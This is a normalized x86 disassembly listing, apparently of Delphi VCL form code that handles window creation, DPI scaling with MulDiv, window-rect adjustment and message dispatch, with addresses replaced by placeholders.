je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ ebp - 0x4 ]
mov si 0xffa6
call sub_40587c
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xd1 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_495df8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x384 ] 0x1
xor eax eax
push ebp
push sub_495db9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_43010c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x384 ] 0xfe
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4054c8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
sub_495e3c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x379 ] 0x0
jne r-xdata
test [ ebx + 0x384 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_40587c
and [ ebx + 0x384 ] 0xdf
sub_495e74
push ebx
push esi
mov ebx eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_49c75c
xor edx edx
mov eax ebx
call sub_49c798
mov edx 0x140
mov eax ebx
call sub_4704a0
mov edx 0xf0
mov eax ebx
call sub_4704d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_452dd4
mov esi eax
mov [ ebx + 0x2ac ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x2ac ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x2ac ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_496954
mov [ ebx + 0x29f ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov esi eax
mov [ ebx + 0x2a4 ] esi
mov edx ebx
mov eax esi
call sub_46f4f8
movzx eax [ r-xdata ]
mov [ ebx + 0x298 ] al
mov [ ebx + 0x299 ] 0x2
mov [ ebx + 0x29a ] 0x0
mov [ ebx + 0x2a0 ] 0x3
mov [ ebx + 0x2b0 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x2c4 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a24f4
mov esi eax
mov [ ebx + 0x374 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_49c7e4
mov [ ebx + 0x378 ] 0x0
mov [ ebx + 0x2a3 ] 0x1
mov edx [ ebx ]
mov eax edx
mov [ ebx + 0xa8 ] eax
mov [ ebx + 0x341 ] 0xff
xor eax eax
mov [ ebx + 0x36c ] eax
xor edx edx
mov eax ebx
call sub_496cd0
xor edx edx
mov eax ebx
call sub_471030
xor edx edx
mov eax ebx
call sub_470f84
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov dl 0x1
mov eax ebx
call sub_479ebc
mov edx ebx
mov eax [ rw-data ]
call sub_49d5e0
mov [ ebx + 0x364 ] 0xa
pop esi
pop ebx
retn
sub_495fed
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4952d0
mov eax edi
mov si 0xffa6
call sub_40587c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_496038
push esi
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax esi
call sub_43c47c
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
mov edx esi
xor ecx ecx
call sub_4307b0
xor edx edx
mov eax esi
call sub_435510
cmp [ esi + 0x2cc ] 0x0
je r-xdata
cmp [ esi + 0x29e ] 0x1
je r-xdata
mov eax [ esi + 0x2cc ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ esi + 0x379 ] 0x0
jne r-xdata
test [ esi + 0x384 ] 0x4
jne r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xfc ]
mov eax esi
call sub_49bba0
sub_4960ac
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_405bb4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_49f04c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor ecx ecx
push ebp
push sub_4961c4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x379 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_499bf4
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_49d618
mov eax [ ebp - 0x4 ]
add eax 0x2a4
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ ebp - 0x4 ]
add eax 0x2ac
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ ebp - 0x4 ]
add eax 0x344
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ ebp - 0x4 ]
add eax 0x350
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ ebp - 0x4 ]
add eax 0x374
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_495374
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4961cb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4961e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x332 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x384 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_496221
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x334 ]
call [ ebx + 0x330 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_496cd0
sub_496226
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_40587c
test al al
jne r-xdata
call sub_406174
mov eax [ ebp - 0x4 ]
test [ eax + 0x384 ] 0x2
je r-xdata
call sub_406120
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_496cd0
sub_49625c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x33a ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_49629d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4962bc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_473990
cmp [ ebx + 0x290 ] 0x0
je r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x374 ]
call sub_4a25fc
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x3c ]
mov eax [ ebx + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax ebx
call sub_470f84
mov edi [ ebx + 0x290 ]
xor eax eax
mov [ ebx + 0x290 ] eax
mov eax edi
mov si 0xffb6
call sub_40587c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_49c7e4
mov edx edi
mov eax ebx
call sub_499690
sub_496340
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4758e4
mov eax ebx
sub al 0x1
jb r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
je r-xdata
cmp [ edi + 0x2bc ] 0x0
je r-xdata
cmp [ edi + 0x2b4 ] 0x0
jne r-xdata
cmp esi [ edi + 0x2b4 ]
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x2bc ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x2c0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_498258
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp esi [ edi + 0x2c8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_498230
mov edx esi
mov eax edi
call sub_498258
jmp r-xdata
cmp esi [ edi + 0x34c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_49820c
mov eax [ edi + 0x344 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_498584
mov eax [ edi + 0x350 ]
test eax eax
je r-xdata
mov edx esi
call sub_430608
test eax eax
jl r-xdata
cmp esi [ edi + 0x358 ]
jne r-xdata
mov edx esi
call sub_430608
test eax eax
jl r-xdata
mov edx eax
mov eax [ edi + 0x344 ]
call sub_430438
mov edx edi
mov eax esi
call sub_43c510
cmp esi [ edi + 0x2e0 ]
jne r-xdata
xor eax eax
mov [ edi + 0x358 ] eax
mov edx eax
mov eax [ edi + 0x350 ]
call sub_430438
mov edx edi
mov eax esi
call sub_43c510
xor eax eax
mov [ edi + 0x2e0 ] eax
sub_49647c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_475374
xor edx edx
push ebp
push sub_4966f9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2d0 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2d4 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2d8 ] edx
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40557c
cmp eax [ r-xdata ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_474530
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c4 ] 0x0
je r-xdata
movzx eax [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x379 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d4 ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_470764
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
mov [ eax + 0x88 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4707a4
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4968a0
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d8 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov edx [ rw-data ]
cmp eax [ edx + 0x44 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_472314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_496700
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_495980
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4795fc
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_495980
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2d8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_470888
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2d8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4795fc
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x64 ]
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_44c464
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d0 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2d0 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d4 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2d4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2d8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
sub_496709
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_475e88
push 0x0
push 0x0
push ebx
push sub_496848
movzx ecx [ ebx + 0x60 ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_496814
push ebx
push sub_49682c
movzx ecx [ ebx + 0x60 ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4968bf
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_495980
mov ecx edi
mov edx esi
mov eax ebx
call sub_4795fc
mov eax ebx
call sub_4969b0
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x64 ]
mov eax ebp
call sub_44c548
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_44c564
mov ecx edi
mov edx esi
mov eax ebx
call sub_470888
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47078c
mov ebp eax
push edi
push esi
mov eax ebx
call sub_47074c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_496c68
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_496c9c
sub_496954
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
je r-xdata
mov eax ebx
call sub_47a060
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
cmp [ ebx + 0x299 ] 0x3
je r-xdata
mov eax ebx
call sub_499d68
push eax
push 0x1
push 0x80
mov eax ebx
call sub_479ce0
push eax
call __imp_SendMessageW
pop ebx
retn
sub_4969e8
push ebx
mov ebx eax
mov eax ebx
call sub_497fec
test al al
je r-xdata
xor eax eax
pop ebx
retn
movzx eax [ ebx + 0x299 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x274 ]
je r-xdata
sub_496a7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_479e48
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
push eax
cmp [ ebx + 0x2b4 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_496b04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_47a324
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_43caf8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cacc
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40587c
test al al
jne r-xdata
sub_496b88
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
mov ecx [ ebx ]
mov edx ecx
cmp edx eax
sete al
pop ebx
retn
sub_496bac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebp
call sub_475884
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_43caf8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_47a36c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_43cacc
mov si 0xfff1
call sub_40587c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43cb08
jmp r-xdata
sub_496c40
push ebx
mov ebx eax
cmp dl [ ebx + 0x62 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_471054
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_472314
sub_496c68
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_470764
pop ebx
retn
mov [ ebx + 0x2d0 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x88 ]
mov [ ebx + 0x88 ] al
pop ebx
retn
sub_496c9c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4707a4
pop ebx
retn
mov [ ebx + 0x2d4 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x88 ]
mov [ ebx + 0x88 ] al
pop ebx
retn
sub_496cd0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x384 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_470d70
cmp bl [ esi + 0x59 ]
je r-xdata
and [ esi + 0x384 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x384 ] 0x2
jmp r-xdata
mov eax esi
call sub_498724
pop esi
pop ebx
retn
sub_496d14
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_496d73
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x29e ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_496d7a
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ eax + 0x59 ] 0x0
je r-xdata
cmp [ eax + 0x34 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
sub_496d84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp ebx eax
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
je r-xdata
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_496e34
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47ba3c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47bb08
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x290 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4763e8
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ba3c
sub_496e40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43c6a4
cmp [ ebx + 0x2bc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x2bc ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_496e80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x112
jg r-xdata
add edx 0xfffffce2
sub edx 0x2
jb r-xdata
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_49c7e4
jmp r-xdata
sub edx 0xacfa
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf120
je r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4769e4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf030
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40587c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
sub edx 0x2c
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40587c
jmp r-xdata
mov esi [ ebx + 0x4 ]
xor edi edi
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_479ce0
push eax
call IsIconic
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x11 ] al
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4769e4
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b4 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
sub edx 0x1a
je r-xdata
test esi esi
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4a2328
jmp r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x2
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
xor ecx ecx
call sub_46084c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_472314
push 0x0
xor ecx ecx
mov edx 0xb050
mov eax [ ebp - 0x4 ]
call sub_472314
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_497e38
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_49724f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
